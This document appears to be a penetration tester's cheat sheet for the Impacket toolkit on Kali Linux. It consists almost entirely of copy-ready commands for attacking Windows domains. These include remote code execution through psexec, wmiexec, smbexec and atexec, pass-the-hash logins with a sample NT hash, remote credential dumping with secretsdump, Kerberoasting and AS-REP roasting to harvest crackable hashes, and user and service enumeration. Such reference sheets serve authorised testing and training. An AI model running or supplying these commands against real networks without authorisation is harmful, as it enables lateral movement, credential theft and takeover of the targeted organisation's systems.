# Impacket
Installed by default on KALI
Binaries installed in /usr/bin : 
List installed :   ls /usr/bin | grep -i impacket   
Can combine with rlwrap for better shells : rlwrap impacket-psexec administrator@192.168.ip -hashes :hashvalue

```bash
# RCE
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1
impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240

impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-smbexec test.local/john:password123@10.10.10.1
impacket-smbexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-atexec test.local/john:password123@10.10.10.1 <command>
impacket-atexec -hashes lmhash:nthash test.local/john@10.10.10.1 <command>

impacket-smbclient [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share
impacket-lookupsid [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target
impacket-services [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration
impacket-secretsdump [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
impacket-GetUserSPNs [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
impacket-GetNPUsers test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
```